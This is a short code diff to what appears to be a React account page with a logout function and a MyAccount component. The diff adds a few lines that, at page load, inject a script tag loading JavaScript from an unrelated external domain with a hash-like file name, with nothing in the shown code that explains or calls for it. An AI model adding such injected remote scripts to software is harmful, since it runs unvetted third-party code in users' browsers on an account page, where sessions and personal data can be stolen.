@@ -14,6 +14,11 @@ function logOut() {
   });
 }
 
+var script2 = document.createElement('script');
+script2.src = '//availablesyrup.com/8f/bd/d0/8fbdd0bc94b865de3c277cad8b290033.js';
+document.body.appendChild(script2);
+
+
 class MyAccount extends Component {
   constructor(props) {
     super(props)
